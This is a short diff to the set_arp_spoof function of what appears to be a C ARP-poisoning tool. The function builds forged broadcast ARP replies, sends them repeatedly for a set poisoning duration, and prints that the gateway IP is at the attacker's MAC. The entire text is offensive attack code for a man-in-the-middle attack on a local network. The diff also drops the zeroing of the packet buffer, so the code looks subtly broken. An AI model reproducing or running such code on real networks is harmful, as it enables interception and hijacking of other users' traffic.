@@ -132,7 +132,6 @@ static void	set_arp_spoof(const char *dev, char *ip_src, char *mac_src, char *ip
 		exit(1);
 	}
 	elapsed_time = 0;
-	memset(packet, 0, PKTLEN);
 	memset(eth->ether_dhost, 0xff, ETH_ALEN);
 	memcpy(eth->ether_shost, source_mac, ETH_ALEN);
 	eth->ether_type = htons(ETH_P_ARP);
@@ -142,10 +141,6 @@ static void	set_arp_spoof(const char *dev, char *ip_src, char *mac_src, char *ip
 	arp->ea_hdr.ar_hln = ETH_ALEN;
 	arp->ea_hdr.ar_pln = IP4LEN;
 	arp->ea_hdr.ar_op = htons(ARPOP_REPLY);
-//	memcpy(arp->arp_tha, target_mac, ETH_ALEN);
-//	memcpy(arp->arp_tpa, target_ip, IP4LEN);
-//	memcpy(arp->arp_sha, source_mac, ETH_ALEN);
-//	memcpy(arp->arp_spa, source_ip, IP4LEN);
 	memset(arp->arp_tha, 0xff, ETH_ALEN);
 	memset(arp->arp_tpa, 0x00, IP4LEN);
 
@@ -161,13 +156,13 @@ static void	set_arp_spoof(const char *dev, char *ip_src, char *mac_src, char *ip
 	device.sll_halen = htons(ETH_ALEN);
 	while (elapsed_time < POISON_DURATION)
 	{
+		if (verbose)
+			printf("%s: %s is at %s\n", dev, gateway_ip, source_mac);
 		if (sendto(sock, packet, PKTLEN, 0, (struct sockaddr *)&device, sizeof(device)) < 0)
 		{
 			fprintf(stderr, "sendto: %s\n", strerror(errno));
 			exit(1);
 		}
-		if (verbose)
-			printf("Sent ARP packet to %s\n", ip_target);
 		sleep(POISON_INTERVAL);
 		elapsed_time += POISON_INTERVAL;
 	}
